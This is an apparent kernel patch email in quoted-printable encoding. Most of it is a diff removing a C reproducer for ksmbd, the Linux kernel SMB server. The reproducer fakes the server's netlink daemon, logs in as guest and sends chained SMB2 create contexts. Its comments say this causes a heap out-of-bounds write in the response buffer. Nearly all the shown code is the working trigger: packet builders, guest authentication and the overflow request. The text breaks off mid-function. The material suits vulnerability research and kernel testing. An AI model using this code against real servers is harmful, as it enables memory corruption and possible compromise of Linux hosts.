-	struct genlmsghdr *gnl =3D (struct genlmsghdr *)NLMSG_DATA(nlh);
-	int rem =3D nlh->nlmsg_len - NLMSG_LENGTH(sizeof(*gnl));
-	struct nlattr *a =3D (struct nlattr *)((char *)gnl + sizeof(*gnl));
-	while (NLA_OK(a, rem)) {
-		if (a->nla_type =3D=3D CTRL_ATTR_FAMILY_ID)
-			return *(uint16_t *)((char *)a + NLA_HDRLEN);
-		a =3D NLA_NEXT(a, rem);
-	}
-	return -1;
 }
 
-static int start_ksmbd(int family) {
-	/* nl_fd must already exist in init_net: the kernel replies with
-	 * genlmsg_unicast(&init_net, ...), which cannot reach a socket in a
-	 * child netns. TCP is brought up in the new netns afterwards. */
-	if (nl_fd < 0) {
-		nl_fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
-		if (nl_fd < 0) return -1;
-	}
-	struct ksmbd_startup_request *req =3D calloc(1, sizeof(*req));
-	/* Without DURABLE_HANDLE the lease/durable create-context parsers are
-	 * skipped entirely, so those response contexts never get appended. */
-	req->flags =3D (1u << 0) | (1u << 4);	/* LEASES | DURABLE_HANDLE */
-	req->signing =3D 0;
-	/* Invalid strings fall back to ksmbd defaults (SMB2.1..SMB3.1.1). */
-	strcpy((char *)req->min_prot, "SMB2_02");
-	strcpy((char *)req->max_prot, "SMB311");
-	strcpy((char *)req->netbios_name, "KSMBD");
-	strcpy((char *)req->work_group, "WG");
-	strcpy((char *)req->server_string, "ksmbd");
-	req->tcp_port =3D 445;
-	req->file_max =3D 100000;
-	req->smb2_max_write =3D 8388608;
-	req->smb2_max_read =3D 8388608;
-	req->smb2_max_trans =3D 8388608;
-	req->smb2_max_credits =3D 8192;
-	req->max_connections =3D 1024;
-	req->max_ip_connections =3D 1024;
-	req->ifc_list_sz =3D 0;
-	/* 31-char model: create_aapl_rsp_buf writes 62 UTF-16 bytes at +68 =3D 130
-	 * into a 128-byte AAPL slot (2-byte OOB even without the multi-ctx overflow=
-). */
-	memset(req->aapl_model, 'M', 31);
+static int read_id(void)
+{
+	char buf[64];
+	int fd =3D open(TRACEFS "/events/symrace/test/id", O_RDONLY | O_CLOEXEC);
+	ssize_t n;
 
-	struct { struct nlmsghdr nlh; struct genlmsghdr gnl; char attrs[2048]; } msg;
-	memset(&msg, 0, sizeof msg);
-	msg.nlh.nlmsg_type =3D family;
-	msg.nlh.nlmsg_flags =3D NLM_F_REQUEST;
-	msg.gnl.cmd =3D KSMBD_EVENT_STARTING_UP;
-	msg.gnl.version =3D KSMBD_GENL_VERSION;
-	struct nlattr *na =3D (struct nlattr *)msg.attrs;
-	na->nla_type =3D KSMBD_EVENT_STARTING_UP;
-	na->nla_len =3D NLA_HDRLEN + sizeof(*req);
-	memcpy((char *)na + NLA_HDRLEN, req, sizeof(*req));
-	msg.nlh.nlmsg_len =3D NLMSG_LENGTH(sizeof(struct genlmsghdr)) + NLA_ALIGN(na=
-->nla_len);
-	int r =3D send(nl_fd, &msg, msg.nlh.nlmsg_len, 0);
-	free(req);
-	return r < 0 ? -1 : 0;
-}
-
-static void nl_send_resp(int family, int cmd, const void *payload, int plen) {
-	char buf[1024];
-	memset(buf, 0, sizeof buf);
-	struct nlmsghdr *nlh =3D (struct nlmsghdr *)buf;
-	struct genlmsghdr *gnl =3D (struct genlmsghdr *)(buf + NLMSG_HDRLEN);
-	nlh->nlmsg_type =3D family;
-	nlh->nlmsg_flags =3D NLM_F_REQUEST;
-	gnl->cmd =3D cmd;
-	gnl->version =3D KSMBD_GENL_VERSION;
-	struct nlattr *na =3D (struct nlattr *)(buf + NLMSG_HDRLEN + GENL_HDRLEN);
-	na->nla_type =3D cmd;
-	na->nla_len =3D NLA_HDRLEN + plen;
-	memcpy((char *)na + NLA_HDRLEN, payload, plen);
-	nlh->nlmsg_len =3D NLMSG_LENGTH(sizeof(struct genlmsghdr)) + NLA_ALIGN(na->n=
-la_len);
-	send(nl_fd, buf, nlh->nlmsg_len, 0);
-}
-
-static void *ipc_thread(void *arg) {
-	int family =3D (int)(long)arg;
-	char buf[8192];
-	struct timeval tv =3D { .tv_sec =3D 1 };
-	setsockopt(nl_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
-	ipc_running =3D 1;
-	while (ipc_running) {
-		ssize_t n =3D recv(nl_fd, buf, sizeof buf, 0);
-		if (n < (ssize_t)sizeof(struct nlmsghdr)) continue;
-		struct nlmsghdr *nlh =3D (struct nlmsghdr *)buf;
-		fprintf(stderr, "[NL] type=3D%d (family=3D%d) len=3D%u flags=3D0x%x\n",
-			nlh->nlmsg_type, family, nlh->nlmsg_len, nlh->nlmsg_flags);
-		if (nlh->nlmsg_type =3D=3D 2 && n >=3D (ssize_t)(sizeof(struct nlmsghdr) + =
-4)) {
-			int err =3D *(int *)(buf + sizeof(struct nlmsghdr));
-			fprintf(stderr, "[NL] NLMSG_ERROR err=3D%d (%s)\n", err, strerror(-err));
-		}
-		if (nlh->nlmsg_type !=3D family) continue;
-		struct genlmsghdr *gnl =3D (struct genlmsghdr *)NLMSG_DATA(nlh);
-		int cmd =3D gnl->cmd;
-		struct nlattr *a =3D (struct nlattr *)((char *)gnl + sizeof(*gnl));
-		int rem =3D nlh->nlmsg_len - NLMSG_LENGTH(sizeof(*gnl));
-		void *payload =3D NULL; int plen =3D 0;
-		while (NLA_OK(a, rem)) { payload =3D (char *)a + NLA_HDRLEN; plen =3D a->nl=
-a_len - NLA_HDRLEN; a =3D NLA_NEXT(a, rem); }
-		if (!payload) continue;
-
-		fprintf(stderr, "[IPC] cmd=3D%d plen=3D%d\n", cmd, plen);
-		if (cmd =3D=3D KSMBD_EVENT_LOGIN_REQUEST && plen >=3D (int)sizeof(struct ks=
-mbd_login_request)) {
-			struct ksmbd_login_request *lr =3D payload;
-			struct ksmbd_login_response resp;
-			memset(&resp, 0, sizeof resp);
-			resp.handle =3D lr->handle;
-			resp.gid =3D 100;
-			resp.uid =3D 100;
-			memcpy(resp.account, lr->account, KSMBD_REQ_MAX_ACCOUNT_NAME_SZ);
-			resp.status =3D KSMBD_USER_FLAG_OK | KSMBD_USER_FLAG_GUEST_ACCOUNT;
-			resp.hash_sz =3D 16;
-			memset(resp.hash, 0x11, 16);
-			fprintf(stderr, "[IPC] LOGIN account=3D'%s' handle=3D%u -> guest (sizeof r=
-esp=3D%zu)\n",
-				resp.account, resp.handle, sizeof(resp));
-			nl_send_resp(family, KSMBD_EVENT_LOGIN_RESPONSE, &resp, sizeof(resp));
-		} else if (cmd =3D=3D KSMBD_EVENT_SHARE_CONFIG_REQUEST && plen >=3D (int)si=
-zeof(struct ksmbd_share_config_request)) {
-			struct ksmbd_share_config_request *sr =3D payload;
-			fprintf(stderr, "[IPC] SHARE_CONFIG share=3D'%s'\n", sr->share_name);
-			char sresp[2048];
-			memset(sresp, 0, sizeof sresp);
-			struct ksmbd_share_config_response *r =3D (void *)sresp;
-			r->handle =3D sr->handle;
-			r->flags =3D KSMBD_SHARE_FLAG_AVAILABLE | KSMBD_SHARE_FLAG_WRITEABLE |
-				   KSMBD_SHARE_FLAG_GUEST_OK | KSMBD_SHARE_FLAG_OPLOCKS |
-				   KSMBD_SHARE_FLAG_TIME_MACHINE;
-			r->create_mask =3D 0644;
-			r->directory_mask =3D 0755;
-			strcpy(r->share_name, "TEST");
-			const char *path =3D "/tmp";
-			uint32_t plen2 =3D strlen(path) + 1;
-			r->payload_sz =3D plen2;
-			r->veto_list_sz =3D 0;
-			memcpy(sresp + sizeof(*r), path, plen2);
-			fprintf(stderr, "[IPC] SHARE_CONFIG -> flags=3D0x%x sizeof=3D%zu payload=
-=3D%u\n",
-				r->flags, sizeof(*r), plen2);
-			nl_send_resp(family, KSMBD_EVENT_SHARE_CONFIG_RESPONSE, sresp, sizeof(*r) =
-+ plen2);
-		} else if (cmd =3D=3D KSMBD_EVENT_TREE_CONNECT_REQUEST && plen >=3D (int)si=
-zeof(struct ksmbd_tree_connect_request)) {
-			struct ksmbd_tree_connect_request *tr =3D payload;
-			struct ksmbd_tree_connect_response resp;
-			memset(&resp, 0, sizeof resp);
-			resp.handle =3D tr->handle;
-			resp.status =3D 0;
-			resp.connection_flags =3D 0x3;
-			fprintf(stderr, "[IPC] TREE_CONNECT share=3D'%s' sess=3D0x%llx -> ok\n",
-				tr->share, (unsigned long long)tr->session_id);
-			nl_send_resp(family, KSMBD_EVENT_TREE_CONNECT_RESPONSE, &resp, sizeof(resp=
-));
-		}
-	}
-	return NULL;
-}
-
-static void put_hdr(uint8_t *buf, uint16_t cmd, uint64_t mid, uint32_t flags)=
- {
-	struct smb2_hdr *h =3D (struct smb2_hdr *)(buf + 4);
-	memset(buf + 4, 0, 64);
-	h->ProtocolId =3D SMB2_PROTO;
-	h->StructureSize =3D 64;
-	h->Command =3D cmd;
-	h->CreditRequest =3D 31;
-	h->Flags =3D flags;
-	h->MessageId =3D mid;
-	h->ProcessId =3D 0;
-	h->TreeId =3D tree_id;
-	h->SessionId =3D session_id;
-}
-
-static size_t smb_send(int fd, uint8_t *buf, size_t pdu_len) {
-	*(uint32_t *)buf =3D __builtin_bswap32(pdu_len);
-	return write(fd, buf, pdu_len + 4) =3D=3D (ssize_t)(pdu_len + 4) ? pdu_len +=
- 4 : 0;
-}
-
-static ssize_t smb_recv(int fd, uint8_t *buf, size_t cap) {
-	struct timeval tv =3D { .tv_sec =3D 5 };
-	setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);
-	return read(fd, buf, cap);
-}
-
-static size_t build_negotiate(uint8_t *buf) {
-	memset(buf, 0, 512);
-	put_hdr(buf, SMB2_NEGOTIATE, cur_mid++, 0);
-	uint8_t *p =3D buf + 4 + 64;
-	*(uint16_t *)p =3D 36; p +=3D 2;
-	*(uint16_t *)p =3D 2; p +=3D 2;	/* DialectCount */
-	*(uint16_t *)p =3D 1; p +=3D 2;	/* SecurityMode signing enabled */
-	*(uint16_t *)p =3D 0; p +=3D 2;
-	*(uint32_t *)p =3D 0; p +=3D 4;
-	memset(p, 0x41, 16); p +=3D 16;
-	*(uint32_t *)p =3D 0; p +=3D 4;
-	*(uint16_t *)p =3D 0; p +=3D 2;
-	*(uint16_t *)p =3D 0; p +=3D 2;
-	*(uint16_t *)p =3D 0x0210; p +=3D 2;	/* SMB 2.1 */
-	*(uint16_t *)p =3D 0x0300; p +=3D 2;	/* SMB 3.0 -> lease_v2 in rsp */
-	while ((p - buf) & 7) *p++ =3D 0;
-	return (p - buf) - 4;
-}
-
-static size_t build_sesssetup1(uint8_t *buf) {
-	memset(buf, 0, 512);
-	put_hdr(buf, SMB2_SESSION_SETUP, cur_mid++, 0);
-	uint8_t *p =3D buf + 4 + 64;
-	*(uint16_t *)p =3D 25; p +=3D 2;
-	*p++ =3D 0;
-	*p++ =3D 1;
-	*(uint32_t *)p =3D 0; p +=3D 4;
-	*(uint32_t *)p =3D 0; p +=3D 4;
-	uint16_t sec_off =3D 64 + 24;
-	*(uint16_t *)(buf + 4 + 64 + 12) =3D sec_off;
-	uint8_t *sec =3D buf + 4 + sec_off;
-	memcpy(sec, "NTLMSSP", 8); sec +=3D 8;
-	*(uint32_t *)sec =3D 1; sec +=3D 4;
-	*(uint32_t *)sec =3D 0x00008207; sec +=3D 4;
-	*(uint16_t *)sec =3D 0; sec +=3D 2;
-	*(uint16_t *)sec =3D 0; sec +=3D 2;
-	*(uint32_t *)sec =3D 0; sec +=3D 4;
-	*(uint16_t *)sec =3D 0; sec +=3D 2;
-	*(uint16_t *)sec =3D 0; sec +=3D 2;
-	*(uint32_t *)sec =3D 0; sec +=3D 4;
-	uint16_t sec_len =3D sec - (buf + 4 + sec_off);
-	*(uint16_t *)(buf + 4 + 64 + 14) =3D sec_len;
-	p =3D sec;
-	while ((p - buf) & 7) *p++ =3D 0;
-	return (p - buf) - 4;
-}
-
-/*
- * NTLMSSP AUTHENTICATE (type 3) with username "g". Guest path skips NTLMv2
- * verification entirely (user_guest()).
- */
-static size_t build_sesssetup2_guest(uint8_t *buf) {
-	memset(buf, 0, 512);
-	put_hdr(buf, SMB2_SESSION_SETUP, cur_mid++, 0);
-	uint8_t *p =3D buf + 4 + 64;
-	*(uint16_t *)p =3D 25; p +=3D 2;
-	*p++ =3D 0;
-	*p++ =3D 1;
-	*(uint32_t *)p =3D 0; p +=3D 4;
-	*(uint32_t *)p =3D 0; p +=3D 4;
-	uint16_t sec_off =3D 64 + 24;
-	*(uint16_t *)(buf + 4 + 64 + 12) =3D sec_off;
-	uint8_t *sec =3D buf + 4 + sec_off;
-	uint8_t *blob =3D sec;
-
-	/* authenticate_message: sig(8)+type(4)+6*secbuf(8 each)+flags(4) =3D 64 */
-	memset(blob, 0, 64);
-	memcpy(blob, "NTLMSSP", 8);
-	*(uint32_t *)(blob + 8) =3D 3;		/* NtLmAuthenticate */
-
-	/* payload after 64-byte header: username "g" (UTF-16LE) */
-	uint8_t *payload =3D blob + 64;
-	/* DomainName empty at offset 64 */
-	/* UserName at 64, len 2 */
-	payload[0] =3D 'g'; payload[1] =3D 0;
-	uint16_t name_len =3D 2;
-	uint32_t name_off =3D 64;
-
-	/* LmChallengeResponse empty */
-	*(uint16_t *)(blob + 12) =3D 0; *(uint16_t *)(blob + 14) =3D 0; *(uint32_t *=
-)(blob + 16) =3D 0;
-	/* NtChallengeResponse empty (guest) */
-	*(uint16_t *)(blob + 20) =3D 0; *(uint16_t *)(blob + 22) =3D 0; *(uint32_t *=
-)(blob + 24) =3D 0;
-	/* DomainName empty */
-	*(uint16_t *)(blob + 28) =3D 0; *(uint16_t *)(blob + 30) =3D 0; *(uint32_t *=
-)(blob + 32) =3D 0;
-	/* UserName */
-	*(uint16_t *)(blob + 36) =3D name_len;
-	*(uint16_t *)(blob + 38) =3D name_len;
-	*(uint32_t *)(blob + 40) =3D name_off;
-	/* Workstation empty */
-	*(uint16_t *)(blob + 44) =3D 0; *(uint16_t *)(blob + 46) =3D 0; *(uint32_t *=
-)(blob + 48) =3D 0;
-	/* SessionKey empty */
-	*(uint16_t *)(blob + 52) =3D 0; *(uint16_t *)(blob + 54) =3D 0; *(uint32_t *=
-)(blob + 56) =3D 0;
-	*(uint32_t *)(blob + 60) =3D 0x00008207;
-
-	sec +=3D 64 + name_len;
-	uint16_t sec_len =3D sec - (buf + 4 + sec_off);
-	*(uint16_t *)(buf + 4 + 64 + 14) =3D sec_len;
-	p =3D sec;
-	while ((p - buf) & 7) *p++ =3D 0;
-	return (p - buf) - 4;
-}
-
-/*
- * create_context_hdr is 16 bytes (Next/NameOff/NameLen/Reserved16/DataOff/Da=
-taLen).
- * smb2_find_context_vals() requires:
- *   NameOffset =3D=3D 16, NameLength >=3D 4, DataOffset 8-aligned,
- *   DataOffset >=3D 16 + (NameLength < 8 ? 8 : NameLength),
- *   Next 8-aligned.
- * So a 4-byte tag lives at 16..20, data starts at 24.
- */
-static void append_ctx(uint8_t **pp, const char *tag, const void *data, uint3=
-2_t dlen) {
-	uint8_t *p =3D *pp;
-	while ((p - *pp) & 7) *p++ =3D 0;
-	uint8_t *ctx =3D p;
-	uint32_t cc_len =3D 24 + dlen;
-	uint32_t next =3D (cc_len + 7) & ~7u;
-
-	memset(ctx, 0, next);
-	*(uint32_t *)(ctx + 0) =3D 0;		/* Next: filled by caller chain */
-	*(uint16_t *)(ctx + 4) =3D 16;		/* NameOffset */
-	*(uint16_t *)(ctx + 6) =3D 4;		/* NameLength */
-	*(uint16_t *)(ctx + 8) =3D 0;		/* Reserved */
-	*(uint16_t *)(ctx + 10) =3D 24;		/* DataOffset (8-aligned) */
-	*(uint32_t *)(ctx + 12) =3D dlen;		/* DataLength */
-	memcpy(ctx + 16, tag, 4);
-	if (data && dlen)
-		memcpy(ctx + 24, data, dlen);
-	*pp =3D ctx + next;
-}
-
-/*
- * CREATE requesting RqLs + MxAc + QFid + AAPL(MODEL_INFO).
- * Response packing (response_buf =3D 448 incl. 4-byte RFC1002):
- *   4 + 152 (create_rsp) + 84 (lease_v2) + 36 (mxac) + 60 (QFid) + 128 (AAPL)
- *   =3D 464 > 448 allocation  =3D> 16-byte heap OOB write.
- * AAPL model string then writes 2 more bytes past the 128-byte AAPL slot.
- */
-static size_t build_create_overflow(uint8_t *buf) {
-	memset(buf, 0, 2048);
-	put_hdr(buf, SMB2_CREATE, cur_mid++, 0);
-	uint8_t *hdr =3D buf + 4;			/* start of smb2_hdr */
-	uint8_t *p =3D hdr + 64;
-
-	*(uint16_t *)p =3D 57; p +=3D 2;		/* StructureSize */
-	*p++ =3D 0;				/* SecurityFlags */
-	*p++ =3D 0xFF;				/* RequestedOplockLevel =3D LEASE */
-	*(uint32_t *)p =3D 0; p +=3D 4;		/* ImpersonationLevel */
-	memset(p, 0, 16); p +=3D 16;		/* SmbCreateFlags + Reserved */
-	*(uint32_t *)p =3D 0x00120089; p +=3D 4;	/* DesiredAccess */
-	*(uint32_t *)p =3D 0; p +=3D 4;		/* FileAttributes */
-	*(uint32_t *)p =3D 7; p +=3D 4;		/* ShareAccess */
-	*(uint32_t *)p =3D 1; p +=3D 4;		/* CreateDisposition FILE_OPEN */
-	*(uint32_t *)p =3D 0; p +=3D 4;		/* CreateOptions */
-	/* NameOffset / NameLength / CreateContextsOffset / CreateContextsLength */
-	/* Buffer[] begins at hdr+120 (=3D64+56). Use that for empty name. */
-	*(uint16_t *)p =3D 120; p +=3D 2;		/* NameOffset (from smb2 hdr) */
-	*(uint16_t *)p =3D 0; p +=3D 2;		/* NameLength =3D 0 (share root) */
-	uint8_t *ctx_off_p =3D p; p +=3D 4;
-	uint8_t *ctx_len_p =3D p; p +=3D 4;
-	/* p now at hdr+120, 8-aligned. Contexts start here. */
-	uint8_t *ctx_start =3D p;
-
-	/* RqLs: lease_context_v2 =3D 52 bytes (LeaseKey16 + State4 + Flags4 +
-	 * Duration8 + ParentKey16 + Epoch2 + Reserved2). */
-	uint8_t lease_req[52];
-	memset(lease_req, 0, sizeof lease_req);
-	memset(lease_req, 0x22, 16);			/* LeaseKey */
-	*(uint32_t *)(lease_req + 16) =3D 0x7;		/* RWH includes HANDLE_CACHING */
-	append_ctx(&p, "RqLs", lease_req, 52);
-
-	append_ctx(&p, "MxAc", NULL, 0);
-	append_ctx(&p, "QFid", NULL, 0);
-
-	/* DH2Q: durable_context_v2_req =3D Timeout4 + Flags4 + Reserved8 + CreateGu=
-id16 =3D 32 */
-	uint8_t dh2q[32];
-	memset(dh2q, 0, sizeof dh2q);
-	*(uint32_t *)dh2q =3D 0x0001d4c0;			/* Timeout =3D 120000 ms */
-	memset(dh2q + 16, 0x33, 16);			/* CreateGuid */
-	append_ctx(&p, "DH2Q", dh2q, 32);
-
-	/* CONTROL: no AAPL context -> create_aapl_rsp_buf() never runs,
-	 * response packing stays inside the 448-byte allocation. */
-
-	/* Chain Next: each context's Next =3D distance to the next one (8-aligned),
-	 * last one Next =3D 0. append_ctx already rounded each to 8 bytes. */
-	{
-		uint8_t *q =3D ctx_start;
-		while (q < p) {
-			uint32_t next =3D *(uint32_t *)q;
-			uint32_t step;
-			/* recompute step from the tag layout: 24 + dlen, rounded */
-			uint32_t dlen =3D *(uint32_t *)(q + 12);
-			step =3D (24 + dlen + 7) & ~7u;
-			if (q + step >=3D p)
-				next =3D 0;
-			else
-				next =3D step;
-			*(uint32_t *)q =3D next;
-			q +=3D step;
-		}
-	}
-
-	uint32_t ctx_len =3D (uint32_t)(p - ctx_start);
-	*(uint32_t *)ctx_off_p =3D (uint32_t)(ctx_start - hdr);	/* from smb2 hdr */
-	*(uint32_t *)ctx_len_p =3D ctx_len;
-
-	fprintf(stderr, "[CREATE-CTRL] pdu_len=3D%zu ctx_off=3D%u ctx_len=3D%u (no A=
-APL)\n",
-		(p - buf) - 4, (unsigned)(ctx_start - hdr), ctx_len);
-	return (p - buf) - 4;
-}
-
-static size_t build_create_reconnect(uint8_t *buf, uint64_t persistent,
-				     uint64_t volatile_id) {
-	memset(buf, 0, 2048);
-	put_hdr(buf, SMB2_CREATE, cur_mid++, 0);
-	uint8_t *hdr =3D buf + 4;
-	uint8_t *p =3D hdr + 64;
-	*(uint16_t *)p =3D 57; p +=3D 2;
-	*p++ =3D 0;
-	*p++ =3D 0xFF;
-	*(uint32_t *)p =3D 0; p +=3D 4;
-	memset(p, 0, 16); p +=3D 16;
-	*(uint32_t *)p =3D 0x00120089; p +=3D 4;
-	*(uint32_t *)p =3D 0; p +=3D 4;
-	*(uint32_t *)p =3D 7; p +=3D 4;
-	*(uint32_t *)p =3D 1; p +=3D 4;
-	*(uint32_t *)p =3D 0; p +=3D 4;
-	*(uint16_t *)p =3D 120; p +=3D 2;
-	*(uint16_t *)p =3D 0; p +=3D 2;
-	uint8_t *ctx_off_p =3D p; p +=3D 4;
-	uint8_t *ctx_len_p =3D p; p +=3D 4;
-	uint8_t *ctx_start =3D p;
-
-	uint8_t lease_req[52] =3D {0};
-	memset(lease_req, 0x22, 16);
-	*(uint32_t *)(lease_req + 16) =3D 0x7;
-	append_ctx(&p, "RqLs", lease_req, sizeof lease_req);
-
-	uint8_t dh2c[36] =3D {0};
-	*(uint64_t *)(dh2c + 0) =3D persistent;
-	*(uint64_t *)(dh2c + 8) =3D volatile_id;
-	memset(dh2c + 16, 0x33, 16);
-	append_ctx(&p, "DH2C", dh2c, sizeof dh2c);
-	*(uint32_t *)ctx_start =3D 80; /* RqLs context is 24 + 52, rounded to 80. */
-	*(uint32_t *)ctx_off_p =3D (uint32_t)(ctx_start - hdr);
-	*(uint32_t *)ctx_len_p =3D (uint32_t)(p - ctx_start);
-	fprintf(stderr, "[RECONNECT] pdu_len=3D%zu fid=3D(%llu,%llu) ctx_len=3D%u\n",
-		(p - buf) - 4, (unsigned long long)persistent,
-		(unsigned long long)volatile_id, (unsigned)(p - ctx_start));
-	return (p - buf) - 4;
-}
-
-static int reconnect_guest(void) {
-	int fd =3D socket(AF_INET, SOCK_STREAM, 0);
-	struct sockaddr_in a =3D {0};
-	uint8_t buf[4096], rbuf[8192];
-	size_t n;
-	ssize_t rn;
-	a.sin_family =3D AF_INET;
-	a.sin_port =3D htons(445);
-	a.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
-	if (connect(fd, (struct sockaddr *)&a, sizeof a) < 0) {
-		perror("reconnect TCP");
-		return -1;
-	}
-	session_id =3D 0;
-	tree_id =3D 0;
-	cur_mid =3D 0;
-	n =3D build_negotiate(buf); smb_send(fd, buf, n);
-	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
-	fprintf(stderr, "[NEW CONN] negotiate %zd status=3D0x%08x\n", rn,
-		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
-	n =3D build_sesssetup1(buf); smb_send(fd, buf, n);
-	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
-	if (rn >=3D 48) session_id =3D *(uint64_t *)(rbuf + 4 + 40);
-	fprintf(stderr, "[NEW CONN] session1 %zd status=3D0x%08x sid=3D%llu\n", rn,
-		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0,
-		(unsigned long long)session_id);
-	n =3D build_sesssetup2_guest(buf); smb_send(fd, buf, n);
-	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
-	if (rn >=3D 48) session_id =3D *(uint64_t *)(rbuf + 4 + 40);
-	fprintf(stderr, "[NEW CONN] session2 %zd status=3D0x%08x sid=3D%llu\n", rn,
-		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0,
-		(unsigned long long)session_id);
-	memset(buf, 0, 512);
-	put_hdr(buf, SMB2_TREE_CONNECT, cur_mid++, 0);
-	uint8_t *p =3D buf + 4 + 64;
-	*(uint16_t *)p =3D 9; p +=3D 2;
-	*(uint16_t *)p =3D 0; p +=3D 2;
-	*(uint16_t *)p =3D 72; p +=3D 2;
-	uint16_t path[] =3D {'\\','\\','1','2','7','.','0','.','0','.','1','\\','T',=
-'E','S','T'};
-	*(uint16_t *)p =3D sizeof path; p +=3D 2;
-	memcpy(p, path, sizeof path); p +=3D sizeof path;
-	while ((p - buf) & 7) *p++ =3D 0;
-	n =3D (p - buf) - 4;
-	smb_send(fd, buf, n);
-	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
-	if (rn >=3D 4 + 40) tree_id =3D *(uint32_t *)(rbuf + 4 + 36);
-	fprintf(stderr, "[NEW CONN] tree %zd status=3D0x%08x tid=3D%u\n", rn,
-		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0, tree_id);
-	return fd;
-}
-
-int main(void) {
-	fprintf(stderr, "=3D=3D=3D ksmbd_aapl_ctrl start =3D=3D=3D\n");
-	/* Netlink socket MUST live in init_net (kernel unicast targets init_net).
-	 * Create it before unshare(CLONE_NEWNET). */
-	nl_fd =3D socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
-	if (nl_fd < 0) { perror("netlink"); return 1; }
-
-	if (unshare(CLONE_NEWNET) < 0) { perror("unshare"); return 1; }
-
-	int fam =3D genl_family_id();
-	if (fam < 0) { fprintf(stderr, "FAIL genl\n"); return 1; }
-	fprintf(stderr, "genl family=3D%d\n", fam);
-
-	if (start_ksmbd(fam) < 0) { fprintf(stderr, "FAIL start\n"); return 1; }
-
-	pthread_t tid;
-	pthread_create(&tid, NULL, ipc_thread, (void *)(long)fam);
-	usleep(200000);
-
-	{
-		int s =3D socket(AF_INET, SOCK_DGRAM, 0);
-		struct ifreq ifr;
-		memset(&ifr, 0, sizeof ifr);
-		strcpy(ifr.ifr_name, "lo");
-		ioctl(s, SIOCGIFFLAGS, &ifr);
-		ifr.ifr_flags |=3D IFF_UP;
-		ioctl(s, SIOCSIFFLAGS, &ifr);
-		close(s);
-	}
-	usleep(300000);
-
-	int fd =3D socket(AF_INET, SOCK_STREAM, 0);
-	struct sockaddr_in a;
-	memset(&a, 0, sizeof a);
-	a.sin_family =3D AF_INET;
-	a.sin_port =3D htons(445);
-	a.sin_addr.s_addr =3D htonl(INADDR_LOOPBACK);
-	if (connect(fd, (struct sockaddr *)&a, sizeof a) < 0) {
-		perror("connect"); return 1;
-	}
-	fprintf(stderr, "connected\n");
-
-	uint8_t buf[4096], rbuf[8192];
-	size_t n =3D build_negotiate(buf);
-	smb_send(fd, buf, n);
-	ssize_t rn =3D smb_recv(fd, rbuf, sizeof rbuf);
-	fprintf(stderr, "negotiate reply %zd status=3D0x%08x\n", rn,
-		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
-
-	n =3D build_sesssetup1(buf);
-	smb_send(fd, buf, n);
-	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
-	fprintf(stderr, "sesssetup1 reply %zd status=3D0x%08x\n", rn,
-		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
-	if (rn >=3D 48) {
-		session_id =3D *(uint64_t *)(rbuf + 4 + 40);
-		fprintf(stderr, "  session_id=3D0x%llx\n", (unsigned long long)session_id);
-	}
-
-	n =3D build_sesssetup2_guest(buf);
-	smb_send(fd, buf, n);
-	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
-	fprintf(stderr, "sesssetup2 reply %zd status=3D0x%08x\n", rn,
-		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
-	if (rn >=3D 16 && *(uint32_t *)(rbuf + 12) =3D=3D 0) {
-		if (rn >=3D 48) {
-			session_id =3D *(uint64_t *)(rbuf + 4 + 40);
-			fprintf(stderr, "  session established id=3D0x%llx\n",
-				(unsigned long long)session_id);
-		}
-	}
-
-	/* TREE_CONNECT \\TEST */
-	{
-		memset(buf, 0, 512);
-		put_hdr(buf, SMB2_TREE_CONNECT, cur_mid++, 0);
-		uint8_t *p =3D buf + 4 + 64;
-		*(uint16_t *)p =3D 9; p +=3D 2;
-		*(uint16_t *)p =3D 0; p +=3D 2;	/* Flags */
-		*(uint16_t *)p =3D 72; p +=3D 2;	/* PathOffset */
-		uint16_t path[] =3D { '\\', '\\', '1', '2', '7', '.', '0', '.', '0', '.', '=
-1', '\\', 'T', 'E', 'S', 'T' };
-		uint16_t plen =3D sizeof path;
-		*(uint16_t *)p =3D plen; p +=3D 2;
-		memcpy(p, path, plen);
-		p +=3D plen;
-		while ((p - buf) & 7) *p++ =3D 0;
-		n =3D (p - buf) - 4;
-		smb_send(fd, buf, n);
-		rn =3D smb_recv(fd, rbuf, sizeof rbuf);
-		fprintf(stderr, "tree_connect reply %zd status=3D0x%08x\n", rn,
-			rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
-		if (rn >=3D 4 + 36) {
-			tree_id =3D *(uint32_t *)(rbuf + 4 + 36);
-			fprintf(stderr, "  tree_id=3D%u\n", tree_id);
-		}
-	}
-
-	/* CREATE with 4 contexts -> heap OOB write into the 448-byte response_buf */
-	n =3D build_create_overflow(buf);
-	smb_send(fd, buf, n);
-	rn =3D smb_recv(fd, rbuf, sizeof rbuf);
-	fprintf(stderr, "create reply %zd status=3D0x%08x\n", rn,
-		rn >=3D 16 ? *(uint32_t *)(rbuf + 12) : 0);
-	if (rn > 0) {
-		fprintf(stderr, "create hex (%zd):\n", rn);
-		for (int i =3D 0; i < rn; i +=3D 16) {
-			fprintf(stderr, "  %04x:", i);
-			for (int j =3D 0; j < 16 && i + j < rn; j++)
-				fprintf(stderr, " %02x", rbuf[i + j]);
-			fprintf(stderr, "\n");
-		}
-		/* Look for AAPL / RqLs / MxAc / QFid tags in the response. */
-		for (int i =3D 0; i + 4 <=3D rn; i++) {
-			if (!memcmp(rbuf + i, "AAPL", 4) || !memcmp(rbuf + i, "RqLs", 4) ||
-			    !memcmp(rbuf + i, "MxAc", 4) || !memcmp(rbuf + i, "QFid", 4) ||
